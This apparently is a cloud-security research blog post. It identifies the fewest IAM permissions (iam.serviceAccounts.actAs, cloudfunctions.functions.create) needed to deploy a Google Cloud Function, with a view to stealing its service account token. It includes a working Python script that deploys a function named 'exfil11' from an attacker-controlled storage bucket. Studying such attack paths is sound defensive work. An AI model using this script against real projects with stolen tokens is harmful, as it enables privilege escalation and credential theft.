**Mapping the Attack Path**

**Ways one can create a Cloud Function in GCP**

There are three ways to create a Cloud Function in GCP: 

1. Cloud Console
2. gCloud Command
3. Cloud Function API (REST & gRPC)

&lt;image>

While Cloud Console may seem user-friendly for creating resources in GCP, we won't be using it. The reason being, creating resources in GCP often involves navigating through different pages, each with its own set of permissions. Depending on the user's level of access, they may not be able to view or access certain pages necessary to create a particular resource. It's important to have a number of permissions in place to ensure that a user can perform the actions they need to within the GCP environment. 

Our focus in this blog is on creating a Cloud Function using the least privileges possible. That's also why attackers tend to use the gCloud command and REST API to create resources. Furthermore, attackers mainly gain access to a GCP environment using stolen or compromised authentication tokens (auth_tokens). Cloud Console doesn't support authentication via auth_tokens. As a result, attackers may prefer to use the gCloud command or REST API to create resources because they offer more flexibility in terms of authentication and control.

Now let’s dig deeper into it.

If you're creating a Cloud Function in GCP, you can use **Cloud Console, gCloud Command, **or** Cloud Function API** to do so. Regardless of the method you choose, you will need to upload the code that provides access to the Service Account Token. There are three different ways to upload the code:

1. Local Machine
2. Cloud Storage
3. Cloud Repository

&lt;image>

**Permission Required for Deploying a Cloud Function**

Let’s start with the first step of deploying/creating a Cloud Function. As always every action in GCP requires you to have a certain amount of Permissions. Thus, let's try to find the least amount of permissions required for deploying/creating a Cloud Function. 

Here’s the list of Least number of Permissions I found that’s required to “Deploy a Cloud Function via gCloud”

<table>
  <tr>
   <td colspan="3" ><strong>Cloud Function Deploy via gCloud</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage (Different Project)</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository
(Different Project)</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>


Note: 
1. Different Project means the Source Code is uploaded to a Cloud Storage / Repository of a project different than the one being exploited. Project where the Attacker has full control.
2. Last two permissions in bottom right (source.repos.get & source.repos.list) are required to be granted to the “Google Cloud Functions Service Agent” in Attacker’s controlled project for it to be able to read the repository and upload the code in the Function. 

The format of the service account email for the Google Cloud Functions Service Agent is service-{PROJECT_NUMBER}@gcf-admin-robot.iam.gserviceaccount.com. Figuring out the Google Cloud Functions Service Agent email requires one to know the Project Number, which might need additional permissions. 

For gCloud 
 
&lt;image>

Every permission mentioned in the list seems to do something which is quite clear from their name. But here’s something I found really strange, why is there a need for  “cloudfunctions.functions.get” permission for creating a Cloud Function? As far as the documentation goes the description for the permission “cloudfunctions.functions.get” says view functions. ([Link](https://cloud.google.com/functions/docs/reference/iam/permissions))

Which means “cloudfunctions.functions.get” permission allows a user or service account to view metadata about a Cloud Function, such as its name, runtime, entry point, trigger settings, and other configuration details. What I guess is, it may be a default behavior of gCloud to include this permission when creating a function but it is not necessary for the creation of the function.

Using tools like gCloud can be convenient, but sometimes gCloud requires additional permissions beyond what is actually needed for the task at hand. This can result in unnecessarily permission requirements for users. 

One way to narrow down the permission requirements is to not rely on tools like gCloud at all, but to use the Cloud Function API yourself. Cloud Function API can be called via gRPC and REST APIs. Using gRPC or REST APIs can be more precise and efficient in terms of permissions to create resources like Cloud Functions. gRPC and REST API allows us to specify only the necessary permissions for the specific task.

For Cloud Function API 

&lt;image>

That being said let’s look at how to“Deploy a Cloud Function via Cloud Function API (gRPC & REST)”

**Deploying a Cloud Function via Cloud Function API (gRPC)**

gRPC is an open-source Remote Procedure Call (RPC) framework developed by Google. While REST (Representational State Transfer) is an architectural style for building web-based software systems. REST APIs are commonly used to access and manage cloud resources. 

Won't go into much details and step straight into the point. Here is the list of Permission required to successfully deploy a Cloud Function via Cloud Function API (gRPC & REST). 



<table>
  <tr>
   <td colspan="3" ><strong>Cloud Function Deploy via Cloud Function API (gRPC & REST)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>



[Note: You might need additional permissions to successfully upload code from the two sources: Local Machine and Cloud Repository via Cloud Function API (gRPC & REST).  However, for the Source: Cloud Storage, the permissions listed are the least that’s required. Since it’s easier to do it via Cloud Storage, why even bother with the other two? :)] 


If you take a look at the above tables (Table 1 & 2), it's clear that of the two methods for deploying a Cloud Function (using gCloud or the Cloud Function API), uploading the source code via Cloud Storage using the Cloud Function API requires the least amount of permissions and can easily be chosen over any other method. Here’s a figure to understand it better. 
 
&lt;Image 3>

&lt;Image 4>

 
Let’s call the Cloud Function API using both gRPC and REST to deploy a Cloud Function (Code Upload Source: Cloud Storage). 

Below is a code that’s calling the Cloud Function API via gRPC to deploy a Cloud Function in GCP. It’s using the method being create_function() from the google.cloud.functions_v1.CloudFunctionsServiceClient class. Note that for uploading the Source Code we will be using Cloud Storage, simply because it requires less number of permission than any other method (Check &lt;Figure> ).

```python
from google.cloud.functions_v1 import CloudFunctionsServiceClient, CloudFunction, CreateFunctionRequest
import google.auth
import time

credentials, project_id = google.auth.default()

location = "us-east1"
function_name = "exfil11"
bucket_name = "anirb"
source_zip = "function.zip"
function_entry_point = "exfil"

client = CloudFunctionsServiceClient(credentials=credentials)

url = "https://{}-{}.cloudfunctions.net/{}".format(location, project_id, function_name)

function = CloudFunction(
    name="projects/{}/locations/{}/functions/{}".format(project_id, location, function_name),
    source_archive_url="gs://{}/{}".format(bucket_name, source_zip),
    entry_point=function_entry_point,
    runtime="python38",
    https_trigger={},
)

request = CreateFunctionRequest(location="projects/{}/locations/{}".format(project_id, location), function=function)

try:
    response = client.create_function(request=request)
    result = response.result()
    print(f"[+] Function Invocation URL: {url}")
    print("[+] Cloud Function creation has started")
    print("[+] Takes 1-2 minutes to create")

except Exception as e:
    if "cloudfunctions.operations.get" in str(e):
        print("[+] Permission cloudfunctions.operations.get denied (Not an Issue)")
        print(f"[+] Function Invocation URL: {url}")
        print("[+] Cloud Function creation has started")
        print("[+] Takes 1-2 minutes to create")
        
    else:
        print(f"[!] Error: {str(e)}")
```


Even though a warning pops up that “Permission ‘cloudfunctions.operations.get’ denied on resource” the Cloud Function will be successfully created. The warning is likely due to some internal operations being performed by the Cloud Function service during the creation process.  
 
The Cloud Function however will be created with just the following permissions:
* iam.serviceAccounts.actAs
* cloudfunctions.functions.create




